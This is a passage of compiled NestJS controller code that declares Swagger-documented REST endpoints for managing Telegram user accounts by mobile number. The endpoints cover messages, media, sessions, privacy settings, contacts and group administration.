    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "deleteProfilePhotos", null);
__decorate([
    (0, common_1.Get)('messages/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessages", null);
__decorate([
    (0, common_1.Post)('message/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send a Telegram message as a user' }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the user account to send the message from',
        required: true,
        example: '1234567890',
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, send_message_dto_1.SendMessageDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMessage", null);
__decorate([
    (0, common_1.Post)('messages/forward/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Forward messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ForwardBatchDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ForwardBatchDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "forwardMessage", null);
__decorate([
    (0, common_1.Post)('batch-process/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Process operations in batches' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.BatchProcessDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.BatchProcessDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "processBatchMessages", null);
__decorate([
    (0, common_1.Get)('messages/search/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Search messages in Telegram',
        description: 'Search for messages in a specific chat or globally across all chats'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Messages successfully found',
        type: message_search_dto_1.SearchMessagesResponseDto
    }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid request parameters' }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Mobile number not registered' }),
    (0, swagger_1.ApiUnauthorizedResponse)({ description: 'Unauthorized access' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, message_search_dto_1.SearchMessagesDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "searchMessages", null);
__decorate([
    (0, common_1.Get)('channels/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get channel information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'includeIds', required: false, type: Boolean }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('includeIds')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChannelInfo", null);
__decorate([
    (0, common_1.Post)('forwardMediatoMe/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Forward media messages to me' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'channel', description: 'Channel username or ID', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('channel')),
    __param(2, (0, common_1.Query)('fromChatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "forwardMedia", null);
__decorate([
    (0, common_1.Post)('channels/leave/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Leave channel' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'channel', description: 'Channel ID/username', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('channel')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "leaveChannel", null);
__decorate([
    (0, common_1.Patch)('username/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update the Telegram username of a user' }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the user whose username should be updated',
        required: true,
        example: '1234567890',
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_username_dto_1.UpdateUsernameDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateUsername", null);
__decorate([
    (0, common_1.Post)('2fa/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Setup two-factor authentication' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setup2FA", null);
__decorate([
    (0, common_1.Post)('privacy/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update privacy settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updatePrivacy", null);
__decorate([
    (0, common_1.Post)('privacy/batch/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update multiple privacy settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.PrivacySettingsDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.PrivacySettingsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updatePrivacyBatch", null);
__decorate([
    (0, common_1.Get)('sessions/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get active sessions' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Active sessions retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getActiveSessions", null);
__decorate([
    (0, common_1.Delete)('sessions/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Terminate other sessions' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Other sessions terminated successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "terminateOtherSessions", null);
__decorate([
    (0, common_1.Post)('sessions/new/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create new session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'New session created successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createNewSession", null);
__decorate([
    (0, common_1.Get)('session/info/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get session information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getSessionInfo", null);
__decorate([
    (0, common_1.Post)('session/terminate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Terminate specific session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "terminateSession", null);
__decorate([
    (0, common_1.Get)('monitoring/status'),
    (0, swagger_1.ApiOperation)({ summary: 'Get service health and connection status' }),
    (0, swagger_1.ApiResponse)({ status: 200, type: connection_management_dto_1.ConnectionStatusDto }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getConnectionStatus", null);
__decorate([
    (0, common_1.Get)('monitoring/calllog/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get call log statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getCallLogStats", null);
__decorate([
    (0, common_1.Post)('contacts/add-bulk/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add multiple contacts in bulk' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AddContactsDto }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Contacts added successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.AddContactsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addContactsBulk", null);
__decorate([
    (0, common_1.Get)('contacts/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all contacts' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Contacts retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getContacts", null);
__decorate([
    (0, common_1.Post)('media/send/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send media message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.SendMediaDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.SendMediaDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMedia", null);
__decorate([
    (0, common_1.Get)('media/download/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Download media from a message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'messageId', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('messageId')),
    __param(3, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "downloadMedia", null);
__decorate([
    (0, common_1.Post)('media/album/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send media album (multiple photos/videos)' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.SendMediaAlbumDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMediaAlbum", null);
__decorate([
    (0, common_1.Get)('media/metadata/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get media metadata from a chat' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'types', enum: ['photo', 'video', 'document'], required: false, isArray: true }),
    (0, swagger_1.ApiQuery)({ name: 'startDate', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'endDate', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'limit', description: 'Number of messages to fetch', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'minId', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'maxId', required: false, type: Number }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('types')),
    __param(3, (0, common_1.Query)('startDate')),
    __param(4, (0, common_1.Query)('endDate')),
    __param(5, (0, common_1.Query)('limit')),
    __param(6, (0, common_1.Query)('minId')),
    __param(7, (0, common_1.Query)('maxId')),
    __param(8, (0, common_1.Query)('all')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Array, String, String, Number, Number, Number, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMediaMetadata", null);
__decorate([
    (0, common_1.Get)('media/filter/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get filtered media messages from a chat' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true, description: 'Chat ID to get media from' }),
    (0, swagger_1.ApiQuery)({ name: 'types', required: false, enum: ['photo', 'video', 'document', 'voice'], isArray: true }),
    (0, swagger_1.ApiQuery)({ name: 'startDate', required: false, description: 'Filter media after this date' }),
    (0, swagger_1.ApiQuery)({ name: 'endDate', required: false, description: 'Filter media before this date' }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number, description: 'Number of media items to fetch' }),
    (0, swagger_1.ApiQuery)({ name: 'minId', required: false, type: Number, description: 'Minimum message ID' }),
    (0, swagger_1.ApiQuery)({ name: 'maxId', required: false, type: Number, description: 'Maximum message ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, type: [metadata_operations_dto_1.MediaMetadataDto] }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('types')),
    __param(3, (0, common_1.Query)('startDate')),
    __param(4, (0, common_1.Query)('endDate')),
    __param(5, (0, common_1.Query)('limit')),
    __param(6, (0, common_1.Query)('minId')),
    __param(7, (0, common_1.Query)('maxId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Array, String, String, Number, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getFilteredMedia", null);
__decorate([
    (0, common_1.Get)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get group members' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupMembers", null);
__decorate([
    (0, common_1.Post)('chat/block/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Block a chat/user' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat/User ID to block', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "blockChat", null);
__decorate([
    (0, common_1.Delete)('chat/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete or clear a chat history for a user' }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the user whose chat should be deleted',
        required: true,
        example: '1234567890',
    }),
    (0, swagger_1.ApiQuery)({
        name: 'peer',
        description: 'Username or Peer ID of the chat to delete',
        required: true,
        example: 'someusername',
    }),
    (0, swagger_1.ApiQuery)({ name: 'maxId', required: false, description: 'Delete messages with ID ≤ maxId', example: 100000 }),
    (0, swagger_1.ApiQuery)({ name: 'justClear', required: false, description: 'Only clear history for this user', example: false }),
    (0, swagger_1.ApiQuery)({ name: 'revoke', required: false, description: 'Delete for everyone if possible', example: true }),
    (0, swagger_1.ApiQuery)({ name: 'minDate', required: false, description: 'Minimum date (UNIX timestamp)', example: 1609459200 }),
    (0, swagger_1.ApiQuery)({ name: 'maxDate', required: false, description: 'Maximum date (UNIX timestamp)', example: 1612137600 }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, delete_chat_dto_1.DeleteHistoryDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "deleteChatHistory", null);
__decorate([
    (0, common_1.Get)('messages/inline/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send message with inline button' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'message', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'url', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('message')),
    __param(3, (0, common_1.Query)('url')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMessageWithInlineButton", null);
__decorate([
    (0, common_1.Get)('dialogs/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all dialogs' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number, description: 'Number of dialogs to fetch', default: 500 }),
    (0, swagger_1.ApiQuery)({ name: 'offsetId', required: false, type: Number, description: 'Offset ID for pagination', default: 0 }),
    (0, swagger_1.ApiQuery)({ name: 'archived', required: false, type: Boolean, description: 'Include archived chats', default: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __param(2, (0, common_1.Query)('offsetId')),
    __param(3, (0, common_1.Query)('archived')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, Number, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getAllDialogs", null);
__decorate([
    (0, common_1.Get)('last-active/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get last active time' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Last active time retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getLastActiveTime", null);
__decorate([
    (0, common_1.Post)('group/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new group with advanced options' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.createGroupDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.createGroupDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createGroupWithOptions", null);
__decorate([
    (0, common_1.Post)('group/settings/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update group settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupSettingsDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.GroupSettingsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateGroupSettings", null);
__decorate([
    (0, common_1.Post)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add members to a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.GroupMemberOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addGroupMembers", null);
__decorate([
    (0, common_1.Delete)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove members from a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.GroupMemberOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "removeGroupMembers", null);
__decorate([
    (0, common_1.Post)('group/admin/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Promote or demote group admins' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AdminOperationDto }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.AdminOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "handleAdminOperation", null);
__decorate([
    (0, common_1.Post)('chat/cleanup/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Clean up chat history' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ChatCleanupDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ChatCleanupDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "cleanupChat", null);
__decorate([
    (0, common_1.Get)('chat/statistics/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat ID', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('period')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatStatistics", null);
__decorate([
    (0, common_1.Post)('messages/schedule/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Schedule a message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ScheduleMessageDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ScheduleMessageDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "scheduleMessage", null);
__decorate([
    (0, common_1.Get)('messages/scheduled/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get scheduled messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat ID', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getScheduledMessages", null);
__decorate([
    (0, common_1.Post)('media/voice/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send voice message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendVoiceMessage", null);
__decorate([
    (0, common_1.Post)('media/view-once/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send a view once (disappearing) media message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiConsumes)('multipart/form-data', 'application/json'),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                chatId: { type: 'string', description: 'Chat ID to send the media to' },
                sourceType: { type: 'string', enum: ['path', 'base64', 'binary'], description: 'Source type of media' },
                path: { type: 'string', description: 'path of the media file (when sourceType is Path)' },
                base64Data: { type: 'string', description: 'Base64 data (when sourceType is base64)' },
                binaryData: { type: 'string', format: 'binary', description: 'Binary file (when sourceType is binary)' },
                caption: { type: 'string', description: 'Optional caption for the media' },
                filename: { type: 'string', description: 'Optional filename for the media' }
            },
            required: ['chatId', 'sourceType']
        }
    }),
    (0, common_1.UseInterceptors)((0, platform_express_1.FileInterceptor)('binaryData', {
        storage: multer.memoryStorage()
    })),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'View once media sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Failed to send view once media' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.UploadedFile)()),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object, dto_1.ViewOnceMediaDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendViewOnceMedia", null);
__decorate([
    (0, common_1.Get)('chat/history/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat history with metadata' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'offset', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('offset')),
    __param(3, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatHistory", null);
__decorate([
    (0, common_1.Post)('group/admin/promote/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Promote members to admin' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AdminOperationDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.AdminOperationDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "promoteToAdmin", null);
__decorate([
    (0, common_1.Post)('group/admin/demote/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Demote admin to regular member' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.GroupMemberOperationDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "demoteAdmin", null);
__decorate([
    (0, common_1.Post)('group/unblock/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Unblock a user in a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "unblockGroupUser", null);
__decorate([
    (0, common_1.Get)('group/admins/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get list of group admins' }),
